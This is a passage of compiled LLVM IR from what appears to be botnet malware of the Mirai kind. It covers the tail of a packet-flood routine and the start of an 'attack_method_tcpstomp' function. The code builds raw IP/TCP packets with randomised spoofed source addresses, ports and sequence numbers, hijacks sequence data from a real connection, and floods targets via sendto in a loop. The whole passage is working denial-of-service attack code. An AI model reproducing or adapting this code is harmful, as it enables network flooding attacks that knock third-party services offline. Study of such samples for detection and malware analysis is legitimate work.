  %285 = zext i8 %284 to i32
  %286 = icmp slt i32 %283, %285
  br i1 %286, label %287, label %439

287:                                              ; preds = %282
  %288 = load i8**, i8*** %11, align 8
  %289 = load i32, i32* %9, align 4
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds i8*, i8** %288, i64 %290
  %292 = load i8*, i8** %291, align 8
  store i8* %292, i8** %32, align 8
  %293 = load i8*, i8** %32, align 8
  %294 = bitcast i8* %293 to %struct.iphdr*
  store %struct.iphdr* %294, %struct.iphdr** %33, align 8
  %295 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %296 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %295, i64 1
  %297 = bitcast %struct.iphdr* %296 to %struct.tcphdr*
  store %struct.tcphdr* %297, %struct.tcphdr** %34, align 8
  %298 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %299 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %298, i64 1
  %300 = bitcast %struct.tcphdr* %299 to i8*
  store i8* %300, i8** %35, align 8
  %301 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %302 = load i32, i32* %9, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %301, i64 %303
  %305 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %304, i32 0, i32 2
  %306 = load i8, i8* %305, align 4
  %307 = zext i8 %306 to i32
  %308 = icmp slt i32 %307, 32
  br i1 %308, label %309, label %330

309:                                              ; preds = %287
  %310 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %311 = load i32, i32* %9, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %310, i64 %312
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %313, i32 0, i32 1
  %315 = load i32, i32* %314, align 4
  %316 = call i32 @ntohl(i32 noundef %315) #8
  %317 = call i32 @rand_next()
  %318 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %319 = load i32, i32* %9, align 4
  %320 = sext i32 %319 to i64
  %321 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %318, i64 %320
  %322 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %321, i32 0, i32 2
  %323 = load i8, i8* %322, align 4
  %324 = zext i8 %323 to i32
  %325 = lshr i32 %317, %324
  %326 = add i32 %316, %325
  %327 = call i32 @htonl(i32 noundef %326) #8
  %328 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %329 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %328, i32 0, i32 9
  store i32 %327, i32* %329, align 4
  br label %330

330:                                              ; preds = %309, %287
  %331 = load i32, i32* %28, align 4
  %332 = icmp eq i32 %331, -1
  br i1 %332, label %333, label %337

333:                                              ; preds = %330
  %334 = call i32 @rand_next()
  %335 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 8
  store i32 %334, i32* %336, align 4
  br label %337

337:                                              ; preds = %333, %330
  %338 = load i16, i16* %13, align 2
  %339 = zext i16 %338 to i32
  %340 = icmp eq i32 %339, 65535
  br i1 %340, label %341, label %347

341:                                              ; preds = %337
  %342 = call i32 @rand_next()
  %343 = and i32 %342, 65535
  %344 = trunc i32 %343 to i16
  %345 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %346 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %345, i32 0, i32 3
  store i16 %344, i16* %346, align 4
  br label %347

347:                                              ; preds = %341, %337
  %348 = load i16, i16* %16, align 2
  %349 = zext i16 %348 to i32
  %350 = icmp eq i32 %349, 65535
  br i1 %350, label %351, label %357

351:                                              ; preds = %347
  %352 = call i32 @rand_next()
  %353 = and i32 %352, 65535
  %354 = trunc i32 %353 to i16
  %355 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %356 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %355, i32 0, i32 0
  store i16 %354, i16* %356, align 4
  br label %357

357:                                              ; preds = %351, %347
  %358 = load i16, i16* %17, align 2
  %359 = zext i16 %358 to i32
  %360 = icmp eq i32 %359, 65535
  br i1 %360, label %361, label %367

361:                                              ; preds = %357
  %362 = call i32 @rand_next()
  %363 = and i32 %362, 65535
  %364 = trunc i32 %363 to i16
  %365 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %366 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %365, i32 0, i32 1
  store i16 %364, i16* %366, align 2
  br label %367

367:                                              ; preds = %361, %357
  %368 = load i32, i32* %18, align 4
  %369 = icmp eq i32 %368, 65535
  br i1 %369, label %370, label %374

370:                                              ; preds = %367
  %371 = call i32 @rand_next()
  %372 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %373 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %372, i32 0, i32 2
  store i32 %371, i32* %373, align 4
  br label %374

374:                                              ; preds = %370, %367
  %375 = load i32, i32* %19, align 4
  %376 = icmp eq i32 %375, 65535
  br i1 %376, label %377, label %381

377:                                              ; preds = %374
  %378 = call i32 @rand_next()
  %379 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %380 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %379, i32 0, i32 3
  store i32 %378, i32* %380, align 4
  br label %381

381:                                              ; preds = %377, %374
  %382 = load i8, i8* %27, align 1
  %383 = icmp ne i8 %382, 0
  br i1 %383, label %384, label %387

384:                                              ; preds = %381
  %385 = load i8*, i8** %35, align 8
  %386 = load i32, i32* %26, align 4
  call void @rand_str(i8* noundef %385, i32 noundef %386)
  br label %387

387:                                              ; preds = %384, %381
  %388 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %389 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %388, i32 0, i32 7
  store i16 0, i16* %389, align 2
  %390 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %391 = bitcast %struct.iphdr* %390 to i16*
  %392 = call zeroext i16 @checksum_generic(i16* noundef %391, i32 noundef 20)
  %393 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %394 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %393, i32 0, i32 7
  store i16 %392, i16* %394, align 2
  %395 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %396 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %395, i32 0, i32 6
  store i16 0, i16* %396, align 4
  %397 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %398 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %399 = bitcast %struct.tcphdr* %398 to i8*
  %400 = load i32, i32* %26, align 4
  %401 = sext i32 %400 to i64
  %402 = add i64 20, %401
  %403 = trunc i64 %402 to i16
  %404 = call zeroext i16 @htons(i16 noundef zeroext %403) #8
  %405 = load i32, i32* %26, align 4
  %406 = sext i32 %405 to i64
  %407 = add i64 20, %406
  %408 = trunc i64 %407 to i32
  %409 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %397, i8* noundef %399, i16 noundef zeroext %404, i32 noundef %408)
  %410 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %411 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %410, i32 0, i32 6
  store i16 %409, i16* %411, align 4
  %412 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %413 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %412, i32 0, i32 1
  %414 = load i16, i16* %413, align 2
  %415 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %416 = load i32, i32* %9, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %415, i64 %417
  %419 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %418, i32 0, i32 0
  %420 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %419, i32 0, i32 1
  store i16 %414, i16* %420, align 2
  %421 = load i32, i32* %10, align 4
  %422 = load i8*, i8** %32, align 8
  %423 = load i32, i32* %26, align 4
  %424 = sext i32 %423 to i64
  %425 = add i64 40, %424
  %426 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %427 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %428 = load i32, i32* %9, align 4
  %429 = sext i32 %428 to i64
  %430 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %427, i64 %429
  %431 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %430, i32 0, i32 0
  %432 = bitcast %struct.sockaddr_in* %431 to %struct.sockaddr*
  store %struct.sockaddr* %432, %struct.sockaddr** %426, align 8
  %433 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %434 = load %struct.sockaddr*, %struct.sockaddr** %433, align 8
  %435 = call i64 @sendto(i32 noundef %421, i8* noundef %422, i64 noundef %425, i32 noundef 16384, %struct.sockaddr* %434, i32 noundef 16)
  br label %436

436:                                              ; preds = %387
  %437 = load i32, i32* %9, align 4
  %438 = add nsw i32 %437, 1
  store i32 %438, i32* %9, align 4
  br label %282, !llvm.loop !22

439:                                              ; preds = %282
  br label %281

440:                                              ; preds = %114, %108
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_tcpstomp(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_stomp_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 noundef %45, i64 noundef 16) #7
  %47 = bitcast i8* %46 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %47, %struct.attack_stomp_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 noundef %49, i64 noundef 8) #7
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 noundef zeroext %52, %struct.attack_option* noundef %53, i8 noundef zeroext 2, i32 noundef 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 noundef zeroext %56, %struct.attack_option* noundef %57, i8 noundef zeroext 3, i32 noundef 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 noundef zeroext %60, %struct.attack_option* noundef %61, i8 noundef zeroext 4, i32 noundef 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 noundef zeroext %64, %struct.attack_option* noundef %65, i8 noundef zeroext 5, i32 noundef 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 noundef zeroext %68, %struct.attack_option* noundef %69, i8 noundef zeroext 7, i32 noundef 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 noundef zeroext %72, %struct.attack_option* noundef %73, i8 noundef zeroext 11, i32 noundef 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 noundef zeroext %76, %struct.attack_option* noundef %77, i8 noundef zeroext 12, i32 noundef 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 noundef zeroext %80, %struct.attack_option* noundef %81, i8 noundef zeroext 13, i32 noundef 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 noundef zeroext %84, %struct.attack_option* noundef %85, i8 noundef zeroext 14, i32 noundef 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 noundef zeroext %88, %struct.attack_option* noundef %89, i8 noundef zeroext 15, i32 noundef 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 noundef zeroext %92, %struct.attack_option* noundef %93, i8 noundef zeroext 16, i32 noundef 0)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 noundef zeroext %96, %struct.attack_option* noundef %97, i8 noundef zeroext 0, i32 noundef 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 noundef zeroext %99, %struct.attack_option* noundef %100, i8 noundef zeroext 1, i32 noundef 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 6) #7
  store i32 %103, i32* %10, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %106

105:                                              ; preds = %4
  br label %607

106:                                              ; preds = %4
  store i32 1, i32* %9, align 4
  %107 = load i32, i32* %10, align 4
  %108 = bitcast i32* %9 to i8*
  %109 = call i32 @setsockopt(i32 noundef %107, i32 noundef 0, i32 noundef 3, i8* noundef %108, i32 noundef 4) #7
  %110 = icmp eq i32 %109, -1
  br i1 %110, label %111, label %114

111:                                              ; preds = %106
  %112 = load i32, i32* %10, align 4
  %113 = call i32 @close(i32 noundef %112)
  br label %607

114:                                              ; preds = %106
  store i32 0, i32* %9, align 4
  br label %115

115:                                              ; preds = %492, %114
  %116 = load i32, i32* %9, align 4
  %117 = load i8, i8* %5, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp slt i32 %116, %118
  br i1 %119, label %120, label %495

120:                                              ; preds = %115
  br label %121

121:                                              ; preds = %487, %476, %120
  %122 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #7
  store i32 %122, i32* %26, align 4
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %124, label %125

124:                                              ; preds = %121
  br label %492

125:                                              ; preds = %121
  %126 = load i32, i32* %26, align 4
  %127 = load i32, i32* %26, align 4
  %128 = call i32 (i32, i32, ...) @fcntl(i32 noundef %127, i32 noundef 3, i32 noundef 0)
  %129 = or i32 %128, 2048
  %130 = call i32 (i32, i32, ...) @fcntl(i32 noundef %126, i32 noundef 4, i32 noundef %129)
  %131 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %131, align 4
  %132 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %133 = load i32, i32* %9, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %132, i64 %134
  %136 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i32 0, i32 2
  %137 = load i8, i8* %136, align 4
  %138 = zext i8 %137 to i32
  %139 = icmp slt i32 %138, 32
  br i1 %139, label %140, label %161

140:                                              ; preds = %125
  %141 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %142 = load i32, i32* %9, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %141, i64 %143
  %145 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i32 0, i32 1
  %146 = load i32, i32* %145, align 4
  %147 = call i32 @ntohl(i32 noundef %146) #8
  %148 = call i32 @rand_next()
  %149 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %150 = load i32, i32* %9, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i64 %151
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i32 0, i32 2
  %154 = load i8, i8* %153, align 4
  %155 = zext i8 %154 to i32
  %156 = lshr i32 %148, %155
  %157 = add i32 %147, %156
  %158 = call i32 @htonl(i32 noundef %157) #8
  %159 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %160 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %159, i32 0, i32 0
  store i32 %158, i32* %160, align 4
  br label %170

161:                                              ; preds = %125
  %162 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %163 = load i32, i32* %9, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %162, i64 %164
  %166 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %165, i32 0, i32 1
  %167 = load i32, i32* %166, align 4
  %168 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %169 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %168, i32 0, i32 0
  store i32 %167, i32* %169, align 4
  br label %170

170:                                              ; preds = %161, %140
  %171 = load i16, i16* %17, align 2
  %172 = zext i16 %171 to i32
  %173 = icmp eq i32 %172, 65535
  br i1 %173, label %174, label %179

174:                                              ; preds = %170
  %175 = call i32 @rand_next()
  %176 = and i32 %175, 65535
  %177 = trunc i32 %176 to i16
  %178 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %177, i16* %178, align 2
  br label %183

179:                                              ; preds = %170
  %180 = load i16, i16* %17, align 2
  %181 = call zeroext i16 @htons(i16 noundef zeroext %180) #8
  %182 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %181, i16* %182, align 2
  br label %183

183:                                              ; preds = %179, %174
  %184 = load i32, i32* %26, align 4
  %185 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %186 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %186, %struct.sockaddr** %185, align 8
  %187 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %188 = load %struct.sockaddr*, %struct.sockaddr** %187, align 8
  %189 = call i32 @connect(i32 noundef %184, %struct.sockaddr* %188, i32 noundef 16)
  %190 = call i64 @time(i64* noundef null) #7
  store i64 %190, i64* %31, align 8
  br label %191

191:                                              ; preds = %490, %183
  store i32 16, i32* %29, align 4
  %192 = load i32, i32* %10, align 4
  %193 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i64 0, i64 0
  %194 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %195 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %195, %struct.sockaddr** %194, align 8
  %196 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %197 = load %struct.sockaddr*, %struct.sockaddr** %196, align 8
  %198 = call i64 @recvfrom(i32 noundef %192, i8* noundef %193, i64 noundef 256, i32 noundef 16384, %struct.sockaddr* %197, i32* noundef %29)
  %199 = trunc i64 %198 to i32
  store i32 %199, i32* %33, align 4
  %200 = load i32, i32* %33, align 4
  %201 = icmp eq i32 %200, -1
  br i1 %201, label %202, label %203

202:                                              ; preds = %191
  br label %607

203:                                              ; preds = %191
  %204 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %205 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %204, i32 0, i32 0
  %206 = load i32, i32* %205, align 4
  %207 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %208 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %207, i32 0, i32 0
  %209 = load i32, i32* %208, align 4
  %210 = icmp eq i32 %206, %209
  br i1 %210, label %211, label %482

211:                                              ; preds = %203
  %212 = load i32, i32* %33, align 4
  %213 = sext i32 %212 to i64
  %214 = icmp ugt i64 %213, 40
  br i1 %214, label %215, label %482

215:                                              ; preds = %211
  %216 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i64 0, i64 0
  %217 = getelementptr inbounds i8, i8* %216, i64 20
  %218 = bitcast i8* %217 to %struct.tcphdr*
  store %struct.tcphdr* %218, %struct.tcphdr** %35, align 8
  %219 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %220 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %219, i32 0, i32 0
  %221 = load i16, i16* %220, align 4
  %222 = zext i16 %221 to i32
  %223 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %224 = load i16, i16* %223, align 2
  %225 = zext i16 %224 to i32
  %226 = icmp eq i32 %222, %225
  br i1 %226, label %227, label %481

227:                                              ; preds = %215
  %228 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %229 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %228, i32 0, i32 4
  %230 = load i16, i16* %229, align 4
  %231 = lshr i16 %230, 9
  %232 = and i16 %231, 1
  %233 = zext i16 %232 to i32
  %234 = icmp ne i32 %233, 0
  br i1 %234, label %235, label %460

235:                                              ; preds = %227
  %236 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 4
  %238 = load i16, i16* %237, align 4
  %239 = lshr i16 %238, 12
  %240 = and i16 %239, 1
  %241 = zext i16 %240 to i32
  %242 = icmp ne i32 %241, 0
  br i1 %242, label %243, label %460

243:                                              ; preds = %235
  %244 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %245 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %244, i32 0, i32 0
  %246 = load i32, i32* %245, align 4
  %247 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %248 = load i32, i32* %9, align 4
  %249 = sext i32 %248 to i64
  %250 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %247, i64 %249
  %251 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %250, i32 0, i32 0
  store i32 %246, i32* %251, align 4
  %252 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 2
  %254 = load i32, i32* %253, align 4
  %255 = call i32 @ntohl(i32 noundef %254) #8
  %256 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %257 = load i32, i32* %9, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %256, i64 %258
  %260 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %259, i32 0, i32 1
  store i32 %255, i32* %260, align 4
  %261 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %262 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %261, i32 0, i32 3
  %263 = load i32, i32* %262, align 4
  %264 = call i32 @ntohl(i32 noundef %263) #8
  %265 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %266 = load i32, i32* %9, align 4
  %267 = sext i32 %266 to i64
  %268 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %265, i64 %267
  %269 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %268, i32 0, i32 2
  store i32 %264, i32* %269, align 4
  %270 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %271 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %270, i32 0, i32 1
  %272 = load i16, i16* %271, align 2
  %273 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %274 = load i32, i32* %9, align 4
  %275 = sext i32 %274 to i64
  %276 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %273, i64 %275
  %277 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %276, i32 0, i32 3
  store i16 %272, i16* %277, align 4
  %278 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %279 = load i16, i16* %278, align 2
  %280 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %281 = load i32, i32* %9, align 4
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %280, i64 %282
  %284 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %283, i32 0, i32 4
  store i16 %279, i16* %284, align 2
  %285 = load i32, i32* %24, align 4
  %286 = sext i32 %285 to i64
  %287 = add i64 40, %286
  %288 = call noalias i8* @malloc(i64 noundef %287) #7
  %289 = load i8**, i8*** %12, align 8
  %290 = load i32, i32* %9, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds i8*, i8** %289, i64 %291
  store i8* %288, i8** %292, align 8
  %293 = load i8**, i8*** %12, align 8
  %294 = load i32, i32* %9, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds i8*, i8** %293, i64 %295
  %297 = load i8*, i8** %296, align 8
  %298 = bitcast i8* %297 to %struct.iphdr*
  store %struct.iphdr* %298, %struct.iphdr** %36, align 8
  %299 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %300 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %299, i64 1
  %301 = bitcast %struct.iphdr* %300 to %struct.tcphdr*
  store %struct.tcphdr* %301, %struct.tcphdr** %37, align 8
  %302 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %303 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %302, i64 1
  %304 = bitcast %struct.tcphdr* %303 to i8*
  store i8* %304, i8** %38, align 8
  %305 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %306 = bitcast %struct.iphdr* %305 to i8*
  %307 = load i8, i8* %306, align 4
  %308 = and i8 %307, 15
  %309 = or i8 %308, 64
  store i8 %309, i8* %306, align 4
  %310 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %311 = bitcast %struct.iphdr* %310 to i8*
  %312 = load i8, i8* %311, align 4
  %313 = and i8 %312, -16
  %314 = or i8 %313, 5
  store i8 %314, i8* %311, align 4
  %315 = load i8, i8* %13, align 1
  %316 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %317 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %316, i32 0, i32 1
  store i8 %315, i8* %317, align 1
  %318 = load i32, i32* %24, align 4
  %319 = sext i32 %318 to i64
  %320 = add i64 40, %319
  %321 = trunc i64 %320 to i16
  %322 = call zeroext i16 @htons(i16 noundef zeroext %321) #8
  %323 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %324 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %323, i32 0, i32 2
  store i16 %322, i16* %324, align 2
  %325 = load i16, i16* %14, align 2
  %326 = call zeroext i16 @htons(i16 noundef zeroext %325) #8
